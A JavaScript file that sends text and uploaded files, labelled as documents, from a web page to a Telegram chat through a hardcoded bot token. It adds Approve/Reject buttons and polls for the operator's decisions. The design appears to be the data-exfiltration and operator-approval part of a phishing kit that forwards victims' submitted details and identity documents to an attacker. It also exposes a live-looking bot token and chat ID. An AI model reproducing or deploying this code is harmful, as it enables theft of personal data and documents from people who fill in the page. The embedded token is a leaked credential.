const BOT_TOKEN = '8991307509:AAFDRfME3fMly1R2mhVdTBnH5yv2z-5I0s0';
const ADMIN_CHAT_ID = '7867527304';

function sendToTelegram(text, files = [], chatId = ADMIN_CHAT_ID) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    const photoUrl = files[0] || null;
    if (photoUrl) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                photo: photoUrl,
                caption: text,
                parse_mode: 'HTML'
            })
        }).catch(console.error);
    } else {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'HTML'
            })
        }).catch(console.error);
    }
}

async function sendWithButtons(text, files = []) {
    const keyboard = {
        inline_keyboard: [[
            { text: '✅ Approve', callback_data: 'approve' },
            { text: '❌ Reject', callback_data: 'reject' }
        ]]
    };
    
    if (files.length > 0 && files[0] instanceof File) {
        const formData = new FormData();
        formData.append('chat_id', ADMIN_CHAT_ID);
        formData.append('photo', files[0]);
        formData.append('caption', text);
        formData.append('reply_markup', JSON.stringify(keyboard));
        formData.append('parse_mode', 'HTML');
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        
        for (let i = 1; i < files.length; i++) {
            const additionalForm = new FormData();
            additionalForm.append('chat_id', ADMIN_CHAT_ID);
            additionalForm.append('photo', files[i]);
            additionalForm.append('caption', 'Additional document: ' + files[i].name);
            additionalForm.append('reply_markup', JSON.stringify(keyboard));
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: additionalForm
            });
        }
    } else if (files.length > 0 && typeof files[0] === 'string') {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                photo: files[0],
                caption: text,
                reply_markup: JSON.stringify(keyboard),
                parse_mode: 'HTML'
            })
        });
    } else {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: text,
                reply_markup: JSON.stringify(keyboard),
                parse_mode: 'HTML'
            })
        });
    }
}

async function sendNoButtons(text, files = []) {
    if (files.length > 0 && files[0] instanceof File) {
        const fileNames = files.map(f => f.name);
        const captionWithImages = text + '\n\n📎 Documents attached:\n' + fileNames.map((n, i) => `#${i+1}: ${n}`).join('\n');
        
        const formData = new FormData();
        formData.append('chat_id', ADMIN_CHAT_ID);
        formData.append('photo', files[0]);
        formData.append('caption', captionWithImages);
        formData.append('parse_mode', 'HTML');
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        
        for (let i = 1; i < files.length; i++) {
            const additionalForm = new FormData();
            additionalForm.append('chat_id', ADMIN_CHAT_ID);
            additionalForm.append('photo', files[i]);
            additionalForm.append('caption', 'Document: ' + files[i].name);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: additionalForm
            });
        }
    } else if (files.length > 0 && typeof files[0] === 'string') {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                photo: files[0],
                caption: text,
                parse_mode: 'HTML'
            })
        });
    } else {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
    }
}

function pollForUpdates(callback) {
    let offset = 0;
    setInterval(async () => {
        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&timeout=5`);
            const data = await res.json();
            if (data.ok && data.result.length > 0) {
                data.result.forEach(update => {
                    offset = update.update_id + 1;
                    callback(update);
                });
            }
        } catch (e) {
            console.error('Polling error:', e);
        }
    }, 3000);
}

function setApproved(appId) {
    localStorage.setItem('telegram_approved_' + appId, 'true');
    sessionStorage.setItem('telegram_approved_' + appId, 'true');
}

function isApproved(appId) {
    return localStorage.getItem('telegram_approved_' + appId) === 'true' ||
           sessionStorage.getItem('telegram_approved_' + appId) === 'true';
}

function getCurrentAppId() {
    return sessionStorage.getItem('current_app_id') || 'default_app';
}